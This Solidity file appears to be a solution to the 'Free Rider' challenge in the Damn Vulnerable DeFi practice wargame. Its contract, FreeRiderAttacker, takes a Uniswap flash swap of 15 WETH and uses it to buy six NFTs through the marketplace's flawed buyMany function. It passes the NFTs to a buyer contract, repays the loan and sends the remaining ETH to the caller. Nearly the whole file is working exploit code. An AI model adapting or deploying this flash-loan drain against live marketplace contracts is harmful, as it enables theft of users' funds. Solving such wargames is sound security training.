// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";

contract FreeRiderAttacker is IERC721Receiver {
    address payable private weth;
    IUniswapV2Pair private uniswapV2Pair;
    address private factoryV2;
    FreeRiderNFTMarketplace private nftMarketPlace;
    FreeRiderBuyer private freeRiderBuyer;
    DamnValuableNFT private damnValuableNft;

    function attack(
        address _factoryV2,
        address payable _weth,
        address _uniswapV2Pair,
        address payable _nftMarketPlace,
        address _freeRiderBuyer,
        address _damnValuableNft
    ) external payable
    {
        factoryV2 = _factoryV2;
        weth = _weth;
        uniswapV2Pair = IUniswapV2Pair(_uniswapV2Pair);
        nftMarketPlace = FreeRiderNFTMarketplace(_nftMarketPlace);
        freeRiderBuyer = FreeRiderBuyer(_freeRiderBuyer);
        damnValuableNft = DamnValuableNFT(_damnValuableNft);

        // Let's flash swap 15 weth. This calls our uniswapV2Call callback
        uniswapV2Pair.swap(15 ether, 0, address(this), "0x01");

        // The exploit is over, send the attacker the spoils
        payable(msg.sender).transfer(address(this).balance);
    }

    function uniswapV2Call(address, uint amount0, uint, bytes calldata) external {
        // Get ETH for WETH
        (bool success,) = weth.call(abi.encodeWithSignature("withdraw(uint256)", amount0));
        require(success, "weth withdraw failed :(");

        // Buy and transfer the NFTs
        uint256[] memory buys = new uint256[](6);
        for (uint256 i = 0; i < 6; ++i) {
            buys[i] = i;
        }
        nftMarketPlace.buyMany{value: 15 ether}(buys);

        for (uint256 i = 0; i < 6; ++i) {
            damnValuableNft.safeTransferFrom(address(this), address(freeRiderBuyer), uint256(i));
        }

        // Make the swap whole
        uint256 amountToReturn = amount0 * 1000 / 997 + 1;
        (success,) = weth.call{value: amountToReturn}(abi.encodeWithSignature("deposit()"));
        require(success, "weth deposit failed :(");
        (success,) = weth.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, amountToReturn));
        require(success, "weth transfer failed :(");
    }

    // Implement this so we can receive NFTs via safeTransferFrom
    function onERC721Received(address, address, uint256, bytes memory) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // Implement this so we can receive ETH payments
    receive() external payable {}
}